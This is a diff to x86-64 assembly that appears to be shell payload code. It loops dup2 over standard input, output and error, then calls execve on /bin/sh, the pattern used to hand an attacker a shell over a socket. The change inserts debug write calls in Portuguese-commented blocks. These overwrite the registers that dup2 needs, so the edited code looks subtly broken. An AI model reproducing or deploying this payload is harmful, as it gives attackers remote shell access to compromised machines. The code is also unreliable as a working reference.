@@ -50,20 +50,31 @@ _start:
     test    rax, rax
     js      fail
 
-    ; dup2 loop
+    ; dup2 loop com debug a cada syscall
     xor     rsi, rsi
 .loop:
-    mov     al, 33
+    ; debug: dup2()
+    mov     rax, 1
+    mov     rdi, 1
+    mov     rsi, msg_dup2
+    mov     rdx, 15
     syscall
+
+    ; syscall: dup2(rdi, rsi)
+    mov     rax, 33
+    syscall
+    test    rax, rax
+    js      fail
+
     inc     rsi
     cmp     rsi, 3
     jl      .loop
 
-    ; debug: dup2
-    mov rax, 1
-    mov rdi, 1
-    mov rsi, msg_dup2
-    mov rdx, 15
+    ; debug: execve
+    mov     rax, 1
+    mov     rdi, 1
+    mov     rsi, msg_execve
+    mov     rdx, 17
     syscall
 
     ; execve("/bin/sh", NULL, NULL)
